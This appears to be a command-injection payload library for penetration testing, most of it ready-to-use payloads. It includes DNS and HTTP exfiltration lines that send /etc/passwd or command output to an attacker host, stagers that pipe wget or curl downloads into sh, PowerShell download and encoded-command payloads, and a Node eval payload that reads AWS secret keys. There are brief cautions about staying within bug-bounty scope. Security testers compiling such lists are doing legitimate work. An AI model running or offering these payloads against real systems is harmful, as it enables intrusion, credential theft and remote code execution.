# Command Injection Payload Library

> Use OAST collaborator for blind detection. Use minimal benign commands (`id`, `hostname`) for confirmation. NEVER run destructive commands on production targets.

---

## SHELL SEPARATORS

```
;            # sequential
&&           # AND
||           # OR
&            # background
|            # pipe
%0a          # newline (URL)
%0d          # CR (URL)
%0d%0a       # CRLF
\n           # literal newline (in JSON / unquoted contexts)
$()          # command sub
``           # backticks
{cmd,args}   # brace expansion
```

---

## DETECTION (low-risk first)

### Time-based (no OAST needed)
```
;sleep 10
| sleep 10
&& sleep 10
`sleep 10`
$(sleep 10)
%0Asleep%2010
';sleep 10;'
"|sleep 10|"
sleep$IFS$910
${sleep,10}
```
Watch for ~10s response time. Repeat with 5s and 15s to confirm linearity (rules out network noise).

### OAST DNS
```
;curl http://$RANDOM.your.oast/                    # HTTP
;nslookup $RANDOM.your.oast                        # DNS-only
;wget -q -O- http://$RANDOM.your.oast              # HTTP
;ping -c1 $RANDOM.your.oast                        # ICMP+DNS
$(curl http://$RANDOM.your.oast)
` curl http://$RANDOM.your.oast `
%0Acurl%20http://$RANDOM.your.oast
```

For Windows targets:
```
;nslookup $RANDOM.your.oast
&powershell -c "(New-Object Net.WebClient).DownloadString('http://$RANDOM.your.oast')"
&certutil -urlcache -split -f http://$RANDOM.your.oast/x x
```

---

## QUOTE / CONTEXT BREAKOUTS

If input is wrapped:
```
'`whoami`'
"`whoami`"
\`whoami\`
'\";id;//
\";\$(id);//
';"|id|"   (closes single, opens double, pipes)
```

If filtered backticks:
```
$(id)
${IFS}
```

If filtered spaces:
```
{id,arg1,arg2}             # brace, comma-separated
id$IFS$9                    # internal field separator
id<arg                      # input redirect
id\xa9                      # tab via hex if interpreted
id${IFS%??}arg
```

If filtered slashes (path):
```
${PATH:0:1}        # / on Linux
${HOME:0:1}        # /
$(echo${IFS}-e${IFS}'\057')   # -e \057 = /
```

---

## NO-INPUT NETWORK CALLBACK

When you can't see output, exfil via DNS:
```
$(id|base64).your.oast
$(hostname).your.oast
$(whoami).$(id|base64 -w0).your.oast
```

For chunked exfil of larger files:
```
for i in $(cat /etc/passwd | base64 -w62); do dig $i.your.oast; done
```

---

## SHELL-NEUTRAL FOR BUSYBOX / EMBEDDED

Many IoT / router targets use BusyBox — limited binaries:
```
;wget -q http://$ATTACKER/$RANDOM
;wget -O - http://$ATTACKER/x.sh | sh
;telnet $ATTACKER 80
;nc $ATTACKER 80 < /etc/passwd
```

`curl` may not exist; `wget`/`nc` usually do.

---

## ESCALATING TO STAGER

When direct shell-spawning is constrained, fetch a stager:
```
;wget -q -O /tmp/x http://$ATTACKER/x && chmod +x /tmp/x && /tmp/x
;curl -sL http://$ATTACKER/x.sh | sh
```

For your test environment only — don't drop to disk on prod targets.

---

## WINDOWS

### CMD.EXE separators
```
&    # like && in unix but unconditional
&&   # AND
||   # OR
|    # pipe
^    # escape (use ^& to literal-ize &)
%CD% # current dir variable
```

### PoC commands
```
&whoami
&hostname
&dir C:\
&type C:\Windows\System32\drivers\etc\hosts
```

### Powershell
```
&powershell -nop -c "Invoke-WebRequest -Uri http://$ATTACKER/$RANDOM"
&powershell -enc <base64>
```

---

## INJECTION INTO SPECIFIC FUNCTIONS

### `eval` / `Function()` (Node)
```
'+process.mainModule.require ('os').hostname()+'
';return process.env.AWS_SECRET_ACCESS_KEY||1//
```

### PHP shell-runner functions (system / passthru / etc.)
```
;id;
| id |
$(id)
```

### `os.popen` / Python
```
;import os;os.popen ('id').read()
```
Only when injection lands inside an eval-equivalent.

---

## CHAIN-FRIENDLY: SSRF -> CMDI

If app fetches `url=` server-side, gopher to internal services often beats trying CMDI on the URL parser. See `payloads/ssrf-payloads.md`.

---

## COMMON PARAMETERS WHERE CMDI HIDES

```
host=, ip=, dest=, target=, ping=, lookup=, dns=, nslookup=,
file=, path=, name=, page=, doc=, image=, src=,
cmd=, command=, query=, action=, op=, fn=,
filter=, format=, mode=, type=, class=,
url=, link=, ref=, redir=,
log=, tail=,
search=, q=, term=,
debug=, test=, demo=,
language=, locale=, lang=
```

And these endpoints:
```
/cgi-bin/, /admin/diag*, /api/v*/network, /system/, /tools/, /diag,
/admin/maintenance, /support/, /healthcheck/, /api/utils
```

---

## VALIDATION CHECKLIST

- Use OAST hit + benign command (`id`/`hostname`) only
- Capture: full request, OAST log, screenshot of returned output if any
- Note OS, user, and whether sandbox / chroot
- For BBP — STOP after proving impact. Don't read sensitive files, don't pivot.
